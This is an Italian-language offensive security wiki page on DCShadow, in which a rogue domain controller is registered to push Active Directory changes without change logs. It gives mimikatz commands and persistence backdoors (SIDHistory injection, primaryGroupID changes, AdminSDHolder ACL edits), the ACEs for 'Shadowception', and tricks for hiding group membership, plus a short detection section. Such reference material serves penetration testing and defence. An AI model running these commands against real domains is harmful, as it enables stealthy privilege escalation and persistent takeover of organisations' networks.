# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Informazioni di base

Registra un **nuovo Domain Controller** nell'AD e lo utilizza per eseguire il **push degli attributi** (SIDHistory, SPN...) sugli oggetti specificati **senza lasciare alcun **log** relativo alle **modifiche**. Sono necessari i privilegi **DA** ed è necessario trovarsi all'interno del **root domain**.\
Nota che, se utilizzi dati errati, compariranno log piuttosto compromettenti.<sup>[[2]](#references)</sup>

Per eseguire l'attacco sono necessarie 2 istanze di mimikatz. Una di queste avvierà i server RPC con privilegi SYSTEM (qui devi indicare le modifiche che vuoi eseguire), mentre l'altra istanza verrà utilizzata per eseguire il push dei valori:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Nota che **`elevate::token`** non funzionerà nella sessione `mimikatz1`, poiché eleva i privilegi del thread, mentre è necessario elevare il **privilegio del processo**.\
Puoi anche selezionare un oggetto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Puoi applicare le modifiche da un DA o da un utente con questi permessi minimi:

- Nell'**oggetto del dominio**:
- _DS-Install-Replica_ (Aggiungere/Rimuovere una Replica nel Dominio)
- _DS-Replication-Manage-Topology_ (Gestire la Topologia di Replicazione)
- _DS-Replication-Synchronize_ (Sincronizzazione della Replicazione)
- L'**oggetto Sites** (e i relativi elementi figli) nel **contenitore Configuration**:
- _CreateChild e DeleteChild_
- L'oggetto del **computer registrato come DC**:
- _WriteProperty_ (non Write)
- L'**oggetto target**:
- _WriteProperty_ (non Write)

Puoi usare [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) per assegnare questi privilegi a un utente senza privilegi (nota che questo lascerà alcuni log). Questo è molto più restrittivo rispetto ai privilegi DA.\
Ad esempio: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Questo significa che l'utente _**student1**_, quando ha effettuato l'accesso alla macchina _**mcorp-student1**_, dispone dei permessi DCShadow sull'oggetto _**root1user**_.

## Usare DCShadow per creare backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Abuso del gruppo primario, lacune nell'enumerazione e rilevamento

- `primaryGroupID` è un attributo separato dall'elenco `member` del gruppo. DCShadow/DSInternals possono scriverlo direttamente (ad esempio, impostando `primaryGroupID=512` per **Domain Admins**) senza l'enforcement di LSASS sul sistema, ma AD **sposta** comunque l'utente: la modifica del PGID rimuove sempre l'appartenenza al gruppo primario precedente (stesso comportamento per qualsiasi gruppo di destinazione), quindi non è possibile mantenere la precedente appartenenza al gruppo primario.<sup>[[1]](#references)</sup>
- Gli strumenti predefiniti impediscono di rimuovere un utente dal suo gruppo primario corrente (`ADUC`, `Remove-ADGroupMember`), quindi la modifica del PGID richiede in genere scritture dirette nella directory (DCShadow/`Set-ADDBPrimaryGroup`).
- La restituzione delle appartenenze è incoerente:
- **Include** i membri derivati dal gruppo primario: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Esclude** i membri derivati dal gruppo primario: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit durante l'ispezione di `member`, `Get-ADUser <user> -Properties memberOf`.
- I controlli ricorsivi possono non rilevare i membri del gruppo primario se il **gruppo primario è a sua volta annidato** (ad esempio, il PGID dell'utente punta a un gruppo annidato all'interno di Domain Admins); `Get-ADGroupMember -Recursive` o i filtri ricorsivi LDAP non restituiranno quell'utente a meno che la ricorsione non risolva esplicitamente i gruppi primari.
- Trucchi con le DACL: gli attacker possono **negare ReadProperty** su `primaryGroupID` dell'utente (o sull'attributo `member` del gruppo per i gruppi non protetti da AdminSDHolder), nascondendo l'appartenenza effettiva dalla maggior parte delle query PowerShell; `net group` continuerà comunque a risolvere l'appartenenza. I gruppi protetti da AdminSDHolder reimposteranno tali negazioni.

Esempi di rilevamento/monitoraggio:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Verifica incrociata dei gruppi privilegiati confrontando l'output di `Get-ADGroupMember` con `Get-ADGroup -Properties member` o ADSI Edit per rilevare discrepanze introdotte da `primaryGroupID` o da attributi nascosti.<sup>[[1]](#references)</sup>

## Shadowception - Assegnare autorizzazioni DCShadow usando DCShadow (senza log delle autorizzazioni modificate)

Dobbiamo aggiungere i seguenti ACE con il SID del nostro utente alla fine:<sup>[[2]](#references)</sup>

- Sull'oggetto del dominio:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Sull'oggetto computer dell'attacker: `(A;;WP;;;UserSID)`
- Sull'oggetto dell'utente target: `(A;;WP;;;UserSID)`
- Sull'oggetto Sites nel container Configuration: `(A;CI;CCDC;;;UserSID)`

Per ottenere l'ACE corrente di un oggetto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Si noti che in questo caso è necessario apportare **diverse modifiche,** non soltanto una. Pertanto, nella **sessione mimikatz1** (server RPC), utilizzare il parametro **`/stack` per ogni modifica** che si desidera apportare. In questo modo, sarà necessario usare **`/push`** una sola volta per eseguire tutte le modifiche bloccate nel server rogue.

[**Ulteriori informazioni su DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## Riferimenti

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
